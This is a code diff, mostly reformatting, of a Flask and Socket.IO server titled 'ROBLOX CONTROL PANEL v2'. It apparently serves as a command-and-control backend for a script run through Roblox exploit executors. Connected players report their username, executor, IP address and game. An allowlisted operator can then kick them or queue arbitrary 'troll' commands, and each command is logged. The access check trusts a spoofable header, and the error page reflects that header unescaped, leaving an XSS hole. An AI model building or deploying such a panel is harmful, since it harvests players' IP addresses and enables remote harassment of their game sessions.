@@ -1,6 +1,8 @@
 from flask import Flask, request, jsonify, render_template_string, abort
 from flask_socketio import SocketIO
-import time, eventlet
+import time
+import eventlet
+
 eventlet.monkey_patch()
 
 app = Flask(__name__)
@@ -11,24 +13,33 @@ ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}
 connected_players = {}
 pending_kicks = {}
 pending_commands = {}
-command_history = []  # <-- NOUVEL HISTORIQUE
+command_history = []  # Nouvel historique des commandes
 
 def check_ip():
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    if ip and "," in ip: ip = ip.split(",")[0].strip()
-    if ip not in ALLOWED_IPS: abort(403)
+    if ip and "," in ip:
+        ip = ip.split(",")[0].strip()
+    if ip not in ALLOWED_IPS:
+        abort(403)
 
 @app.errorhandler(403)
 def denied(e):
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    if ip and "," in ip: ip = ip.split(",")[0].strip()
-    return '<h1 style="color:red;text-align:center;margin-top:20%">Accès refusé<br>Ton IP: <b>' + ip + '</b></h1>', 403
+    if ip and "," in ip:
+        ip = ip.split(",")[0].strip()
+    return f'<h1 style="color:red;text-align:center;margin-top:20%">Accès refusé<br>Ton IP: <b>{ip}</b></h1>', 403
 
 @app.before_request
-def protect(): 
-    if request.path in ["/", "/kick", "/troll"]: check_ip()
+def protect():
+    if request.path in ["/", "/kick", "/troll"]:
+        check_ip()
 
-HTML = """<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8"><title>ROBLOX PANEL v2</title>
+# HTML du panel (avec tabs Players/History)
+HTML = """<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<title>ROBLOX PANEL v2</title>
 <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
 <style>
 body{background:#0f0f1a;color:#fff;font-family:Arial;margin:0}
@@ -47,7 +58,9 @@ button:hover{transform:scale(1.05)}
 #history table{width:100%;border-collapse:collapse;margin-top:10px}
 #history th, #history td{padding:10px;text-align:left;border-bottom:1px solid #333}
 #history th{background:#1a1a2e}
-</style></head><body>
+</style>
+</head>
+<body>
 <header><h1 style="color:#00ffaa;text-shadow:0 0 20px #00ffaa">ROBLOX CONTROL PANEL v2</h1></header>
 <nav>
     <div class="tab active" onclick="openTab('players')">Players</div>
@@ -109,72 +122,92 @@ socket.on("history",h=>{
 </div>
 </body></html>"""
 
-@app.route("/"); def index(): return render_template_string(HTML)
+@app.route("/")
+def index():
+    return render_template_string(HTML)
 
-@app.route("/api",methods=["GET","POST"])
+@app.route("/api", methods=["GET", "POST"])
 def api():
-    now=time.time()
-    if request.method=="POST":
+    now = time.time()
+    if request.method == "POST":
         try:
-            d=request.get_json()or{}
-            uid=str(d["userid"])
-            if d.get("action")=="register":
-                connected_players[uid]={
-                    "username":d.get("username","Unknown"),
-                    "executor":d.get("executor","Unknown"),
-                    "ip":d.get("ip","Unknown"),
-                    "game":d.get("game","Unknown Game"),
-                    "last":now,"online":True
+            d = request.get_json() or {}
+            uid = str(d["userid"])
+            if d.get("action") == "register":
+                connected_players[uid] = {
+                    "username": d.get("username", "Unknown"),
+                    "executor": d.get("executor", "Unknown"),
+                    "ip": d.get("ip", "Unknown"),
+                    "game": d.get("game", "Unknown Game"),
+                    "last": now,
+                    "online": True
                 }
-            elif d.get("action")=="heartbeat" and uid in connected_players:
-                connected_players[uid]["last"]=now
-        except:pass
-        return jsonify({"ok":True})
-    uid=str(request.args.get("userid",""))
-    if not uid: return jsonify({})
+            elif d.get("action") == "heartbeat" and uid in connected_players:
+                connected_players[uid]["last"] = now
+        except:
+            pass
+        return jsonify({"ok": True})
+    uid = str(request.args.get("userid", ""))
+    if not uid:
+        return jsonify({})
     if uid in pending_kicks:
-        r=pending_kicks.pop(uid,"Kicked")
-        command_history.append({"time":time.strftime("%H:%M:%S"),"user":connected_players.get(uid,{}).get("username","?"),"game":connected_players.get(uid,{}).get("game","?"),"cmd":"KICK: "+r})
-        socketio.emit("history",command_history)
-        return jsonify({"command":"kick","reason":r})
+        r = pending_kicks.pop(uid, "Kicked")
+        command_history.append({
+            "time": time.strftime("%H:%M:%S"),
+            "user": connected_players.get(uid, {}).get("username", "?"),
+            "game": connected_players.get(uid, {}).get("game", "?"),
+            "cmd": "KICK: " + r
+        })
+        socketio.emit("history", command_history)
+        return jsonify({"command": "kick", "reason": r})
     if uid in pending_commands:
-        cmd=pending_commands.pop(uid)
-        command_history.append({"time":time.strftime("%H:%M:%S"),"user":connected_players.get(uid,{}).get("username","?"),"game":connected_players.get(uid,{}).get("game","?"),"cmd":cmd.upper()})
-        socketio.emit("history",command_history)
-        return jsonify({"command":cmd})
+        cmd = pending_commands.pop(uid)
+        command_history.append({
+            "time": time.strftime("%H:%M:%S"),
+            "user": connected_players.get(uid, {}).get("username", "?"),
+            "game": connected_players.get(uid, {}).get("game", "?"),
+            "cmd": cmd.upper()
+        })
+        socketio.emit("history", command_history)
+        return jsonify({"command": cmd})
     return jsonify({})
 
-@app.route("/kick",methods=["POST"])
+@app.route("/kick", methods=["POST"])
 def kick():
     check_ip()
-    data=request.get_json()or{}
-    uid=str(data.get("userid",""))
-    reason=data.get("reason","No reason")
-    pending_kicks[uid]=reason
-    return jsonify({"sent":True})
+    data = request.get_json() or {}
+    uid = str(data.get("userid", ""))
+    reason = data.get("reason", "No reason")
+    pending_kicks[uid] = reason
+    return jsonify({"sent": True})
 
-@app.route("/troll",methods=["POST"])
+@app.route("/troll", methods=["POST"])
 def troll():
     check_ip()
-    data=request.get_json()or{}
-    uid=str(data.get("userid",""))
-    cmd=data.get("cmd","")
-    if uid and cmd: pending_commands[uid]=cmd
-    return jsonify({"sent":True})
+    data = request.get_json() or {}
+    uid = str(data.get("userid", ""))
+    cmd = data.get("cmd", "")
+    if uid and cmd:
+        pending_commands[uid] = cmd
+    return jsonify({"sent": True})
 
 def broadcast():
     while True:
-        now=time.time(); online=0; remove=[]
-        for uid,p in list(connected_players.items()):
-            if now-p["last"]>30: remove.append(uid)
+        now = time.time()
+        online = 0
+        remove = []
+        for uid, p in list(connected_players.items()):
+            if now - p["last"] > 30:
+                remove.append(uid)
             else:
-                p["online"]=now-p["last"]<15
-                if p["online"]: online+=1
+                p["online"] = now - p["last"] < 15
+                if p["online"]:
+                    online += 1
         for uid in remove:
             del connected_players[uid]
-        socketio.emit("update",{"players":connected_players,"online":online})
+        socketio.emit("update", {"players": connected_players, "online": online})
         socketio.sleep(2)
 
-if __name__=="__main__":
+if __name__ == "__main__":
     socketio.start_background_task(broadcast)
-    socketio.run(app,host="0.0.0.0",port=5000)
+    socketio.run(app, host="0.0.0.0", port=5000)
